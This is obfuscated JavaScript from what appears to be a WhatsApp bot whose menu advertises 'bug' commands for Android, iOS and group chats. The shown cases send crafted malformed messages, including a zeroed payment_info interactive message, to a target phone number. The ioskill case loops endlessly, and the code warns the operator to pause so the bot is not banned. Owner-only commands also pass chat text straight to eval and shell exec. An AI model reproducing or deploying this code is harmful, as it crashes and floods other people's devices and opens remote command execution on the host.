            await _0x3dc8b7.relayMessage(_0x55e6ac, _0x3f3e50, {
              'participant': {
                'jid': _0x55e6ac
              }
            }, _0x48ca27);
          }
          await _0x4c3736(_0x392bb4);
          _0x14716a("Successfully Sent Bug To @" + _0x392bb4.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x392bb4]);
        }
        break;
      case "xpaymentgc":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          async function _0x414a5d() {
            const _0x17002b = {
              deviceListMetadataVersion: 0x2,
              deviceListMetadata: {}
            };
            const _0x3bc7aa = {
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"meu ovo\",\"key\":\"+5533998586057\",\"key_type\":\"X\"}}]}"
            };
            const _0x3a4c4c = {
              'buttons': [_0x3bc7aa]
            };
            const _0x3b0a37 = {
              nativeFlowMessage: _0x3a4c4c
            };
            const _0x597776 = {
              messageContextInfo: _0x17002b,
              interactiveMessage: _0x3b0a37
            };
            const _0x34e8c9 = {
              'message': _0x597776
            };
            const _0x11575d = {
              viewOnceMessage: _0x34e8c9
            };
            const _0x4ea0d0 = {
              messageId: null
            };
            await _0x3dc8b7.relayMessage(_0x153ead.chat, _0x11575d, {
              'participant': {
                'jid': _0x153ead.chat
              }
            }, _0x4ea0d0);
          }
          await _0x414a5d();
        }
        break;
      case 'onekill':
      case "oneclickall":
      case "xsamsung":
      case "xwaweb":
      case "doublekill":
      case '💀':
      case 'triplekill':
        {
          if (!_0x891b49) {
            return;
          }
          if (!q) {
            return _0x244b45("Usage ." + _0x44cd63 + " 2348027387246");
          }
          let _0x410494 = q.replace(/[^0-9]/g, '');
          if (_0x410494.startsWith('0')) {
            return _0x244b45("Example : ." + _0x44cd63 + " 2348027387246");
          }
          let _0x81279f = _0x410494 + "@s.whatsapp.net";
          await _0x244b45("In process....");
          for (let _0x525087 = 0; _0x525087 < 1; _0x525087++) {
            await _0x31c1f2(_0x81279f, _0xef6897);
            await _0x1c54a3(_0x81279f, _0xbbb5ad);
            await _0x19c6e6(_0x81279f, _0xef6897);
            await _0x1c54a3(_0x81279f, _0xbbb5ad);
            await _0x3f3274(_0x81279f, _0x368771);
            await _0x1c54a3(_0x81279f, _0xbbb5ad);
          }
          await _0x244b45("Successfully Send Bug to " + _0x410494 + " Using " + _0x44cd63 + ". ✅");
        }
        break;
      case "ioskill":
      case "iosx":
        {
          if (!_0x891b49) {
            return;
          }
          let _0x388de3 = q.replace(/[^0-9]/g, '');
          if (_0x388de3.startsWith('0')) {
            return _0x244b45("Example : ." + _0x44cd63 + " 2348027387246");
          }
          await _0x244b45("In process....");
          let _0x2cb7a3 = _0x388de3 + "@s.whatsapp.net";
          for (;;) {
            await _0x4e8a7d(_0x2cb7a3);
            await sleep(1200);
          }
        }
        break;
      case "clearall":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          const _0x1fc1ef = {
            key: _0x153ead.key,
            messageTimestamp: _0x153ead.messageTimestamp
          };
          const _0x45bb1f = {
            "delete": true,
            lastMessages: [_0x1fc1ef]
          };
          _0x3dc8b7.chatModify(_0x45bb1f, _0x153ead.chat);
        }
        break;
      case 'clearchat':
        _0x54c867("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        break;
      case "menu":
      case "help":
      case "alive":
      case '?':
      case 'allmenu':
        let _0x130daf = "Hello " + _0x5cd3c0 + "\n╰┈➤ " + xeonytimewisher + " 😄\n" + readmore + "\n╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ\n> xandroid \n> xandroid2\n> systemuicrash\n> xsysui\n> xpayment\n> oneshot\n> onekill\n\n╰┈➤ ʙᴜɢ ɪᴏꜱ\n> xios\n> xios2\n> oneshot\n> ioskill\n\n╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ\n> xgc\n\n╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ\n> getsession\n> deletesession\n> join\n> shutdown  \n> restart\n> autoread *[option]*\n> autotyping *[option]*\n> autorecording *[option]*\n> autorecordtyp *[option]*\n> autobio *[option]*\n> autoswview *[option]*\n> mode *[option]*\n> block\n> unblock \n> backup\n> getcase\n> addowner\n> delowner\n\n╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ\n> closetime\n> opentime\n> kick\n> add\n> promote\n> demote\n> setdesc\n> setppgc\n> tagall\n> hidetag\n> totag\n> group *[option]*\n> editinfo\n> linkgc\n> revoke\n> listonline\n\n╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ\n> menu\n> buypremium\n> runtime\n> script\n> donate\n> owner\n\n╰┈➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ\n> sticker\n> smeme\n> take\n> toimage\n> tovideo\n> toaudio\n> tomp3\n> tovn\n> togif\n> tourl\n> toqr\n> toviewonce\n> fliptext\n> emojimix\n\n╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ\n> addvideo\n> addimage\n> addsticker\n> addvn\n> addzip\n> addapk\n> addpdf\n> delvideo\n> delimage\n> delsticker\n> delvn\n> delzip\n> delapk\n> delpdf\n> listvideo\n> listimage\n> liststicker\n> listvn\n> listzip\n> listapk\n> listpdf\n\n╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ\n> play\n> ytmp3\n> ytmp4\n> sound1 - sound161";
        if (typemenu === 'v1') {
          const _0x2098a5 = {
            title: botname,
            body: ownername,
            thumbnailUrl: "https://i.ibb.co/kSs1stX/thumb.jpg",
            sourceUrl: link,
            mediaType: 0x1,
            renderLargerThumbnail: true
          };
          const _0x2f8acc = {
            externalAdReply: _0x2098a5
          };
          const _0x239295 = {
            text: _0x130daf,
            contextInfo: _0x2f8acc
          };
          _0x3dc8b7.sendMessage(_0x153ead.chat, _0x239295, {
            'quoted': _0x153ead
          });
        } else {
          if (typemenu === 'v2') {
            _0x3dc8b7.sendMessage(_0x153ead.chat, {
              'video': fs.readFileSync("./XeonMedia/thumb2.mp4"),
              'gifPlayback': true,
              'caption': _0x130daf,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://i.ibb.co/Wppj16p/cheemspic.jpg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x153ead
            });
          } else {
            if (typemenu === 'v3') {
              _0x3dc8b7.sendMessage(_0x153ead.chat, {
                'video': fs.readFileSync("./XeonMedia/thumb2.mp4"),
                'caption': _0x130daf,
                'gifPlayback': true
              }, {
                'quoted': _0x153ead
              });
            } else {
              if (typemenu === 'v4') {
                const _0x5e3b12 = {
                  callType: "AUDIO",
                  scheduledTimestampMs: 0x4b0,
                  title: _0x130daf
                };
                const _0x290cfa = {
                  scheduledCallCreationMessage: _0x5e3b12
                };
                _0x3dc8b7.relayMessage(_0x153ead.chat, _0x290cfa, {});
              }
            }
          }
        }
        break;
      case 'telestick':
        {
          if (_0x2805cb[0] && _0x2805cb[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let _0x9d17ea = await _0x4291bb(_0x2805cb[0]);
            await _0x244b45("Sending " + _0x9d17ea.length + " stickers...");
            if (_0x153ead.isGroup && _0x9d17ea.length > 30) {
              await _0x244b45("Number of stickers more than 30, bot will send it in private chat.");
              for (let _0x24aef4 = 0; _0x24aef4 < _0x9d17ea.length; _0x24aef4++) {
                const _0x421853 = {
                  url: _0x9d17ea[_0x24aef4].url
                };
                const _0x2ed0cd = {
                  sticker: _0x421853
                };
                _0x3dc8b7.sendMessage(_0x153ead.sender, _0x2ed0cd);
              }
            } else {
              for (let _0x1f615c = 0; _0x1f615c < _0x9d17ea.length; _0x1f615c++) {
                const _0x766f92 = {
                  url: _0x9d17ea[_0x1f615c].url
                };
                const _0x1967c9 = {
                  sticker: _0x766f92
                };
                _0x3dc8b7.sendMessage(_0x153ead.chat, _0x1967c9);
              }
            }
          } else {
            _0x244b45("Where is the telegram sticker link?\nExample. " + (_0x1b9ee2 + _0x44cd63) + " https://t.me/addstickers/FriendlyDeath");
          }
        }
        break;
      default:
        if (_0xbbd56.startsWith('=>')) {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          try {
            _0x244b45(util.format(eval("(async () => { return " + _0xbbd56.slice(3) + " })()")));
          } catch (_0x5e3351) {
            _0x244b45(String(_0x5e3351));
          }
        }
        if (_0xbbd56.startsWith('>')) {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          try {
            let _0x3ed86b = await eval(_0xbbd56.slice(2));
            if (typeof _0x3ed86b !== "string") {
              _0x3ed86b = require("util").inspect(_0x3ed86b);
            }
            await _0x244b45(_0x3ed86b);
          } catch (_0xac206) {
            await _0x244b45(String(_0xac206));
          }
        }
        if (_0xbbd56.startsWith('$')) {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          exec(_0xbbd56.slice(2), (_0x4a7db6, _0x13adf8) => {
            if (_0x4a7db6) {
              return _0x244b45(_0x4a7db6);
            }
            if (_0x13adf8) {
              return _0x244b45(_0x13adf8);
            }
          });
        }
    }
  } catch (_0x1c24b3) {
    console.log(util.format(_0x1c24b3));
  }
};
function _0x4af7(_0x4d758f, _0x15a7f5) {
  const _0x4855fc = _0x4d4f();
  _0x4af7 = function (_0x5ecc0b, _0x133132) {
    _0x5ecc0b = _0x5ecc0b - 405;
    let _0x5134ed = _0x4855fc[_0x5ecc0b];
    if (_0x4af7.NqDfXY === undefined) {
      var _0x3a3ef6 = function (_0x540cec) {
        let _0xdca13c = '';
        let _0x536f6c = '';
        let _0x30492e = _0xdca13c + _0x3a3ef6;
        let _0x7a122 = 0;
        let _0x2d4c6f;
        let _0x4ffcf0;
        for (let _0x2fe734 = 0; _0x4ffcf0 = _0x540cec.charAt(_0x2fe734++); ~_0x4ffcf0 && (_0x2d4c6f = _0x7a122 % 4 ? _0x2d4c6f * 64 + _0x4ffcf0 : _0x4ffcf0, _0x7a122++ % 4) ? _0xdca13c += _0x30492e.charCodeAt(_0x2fe734 + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x2d4c6f >> (-2 * _0x7a122 & 6)) : _0x7a122 : 0) {
          _0x4ffcf0 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x4ffcf0);
        }
        let _0x3558d5 = 0;
        for (let _0x154bd4 = _0xdca13c.length; _0x3558d5 < _0x154bd4; _0x3558d5++) {
          _0x536f6c += '%' + ('00' + _0xdca13c.charCodeAt(_0x3558d5).toString(16)).slice(-2);
        }
        return decodeURIComponent(_0x536f6c);
      };
      _0x4af7.QlNnrL = _0x3a3ef6;
      _0x4d758f = arguments;
      _0x4af7.NqDfXY = true;
    }
    const _0x31ab58 = _0x4855fc[0];
    const _0x3361ac = _0x5ecc0b + _0x31ab58;
    const _0x1ff238 = _0x4d758f[_0x3361ac];
    if (!_0x1ff238) {
      const _0x11327a = function (_0x47cfe5) {
        this.IthWAQ = _0x47cfe5;
        this.smtKFF = [1, 0, 0];
        this.focwFv = function () {
          return 'newState';
        };
        this.xEkTkI = "\\w+ *\\(\\) *{\\w+ *";
        this.kiCsnC = "['|\"].+['|\"];? *}";
      };
      _0x11327a.prototype.uoLznr = function () {
        const _0x53da07 = new RegExp(this.xEkTkI + this.kiCsnC);
        const _0x1e25dd = _0x53da07.test(this.focwFv.toString()) ? --this.smtKFF[1] : --this.smtKFF[0];
        return this.PjyxVY(_0x1e25dd);
      };
      _0x11327a.prototype.PjyxVY = function (_0x4e8e4f) {
        if (!Boolean(~_0x4e8e4f)) {
          return _0x4e8e4f;
        }
        return this.XEjLLV(this.IthWAQ);
      };
      _0x11327a.prototype.XEjLLV = function (_0xaa5f5d) {
        let _0x29e001 = 0;
        for (let _0x234eb3 = this.smtKFF.length; _0x29e001 < _0x234eb3; _0x29e001++) {
          this.smtKFF.push(Math.round(Math.random()));
          _0x234eb3 = this.smtKFF.length;
        }
        return _0xaa5f5d(this.smtKFF[0]);
      };
      new _0x11327a(_0x4af7).uoLznr();
      _0x5134ed = _0x4af7.QlNnrL(_0x5134ed);
      _0x4d758f[_0x3361ac] = _0x5134ed;
    } else {
      _0x5134ed = _0x1ff238;
    }
    return _0x5134ed;
  };
  return _0x4af7(_0x4d758f, _0x15a7f5);
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
process.on("uncaughtException", function (_0x208b1c) {
  let _0x1fe3c0 = String(_0x208b1c);
  if (_0x1fe3c0.includes("conflict")) {
    return;
  }
  if (_0x1fe3c0.includes("Socket connection timeout")) {
    return;
  }
  if (_0x1fe3c0.includes("not-authorized")) {
    return;
  }
  if (_0x1fe3c0.includes("already-exists")) {
    return;
  }
  if (_0x1fe3c0.includes("rate-overlimit")) {
    return;
  }
  if (_0x1fe3c0.includes("Connection Closed")) {
    return;
  }
  if (_0x1fe3c0.includes("Timed Out")) {
    return;
  }
  if (_0x1fe3c0.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x208b1c);
});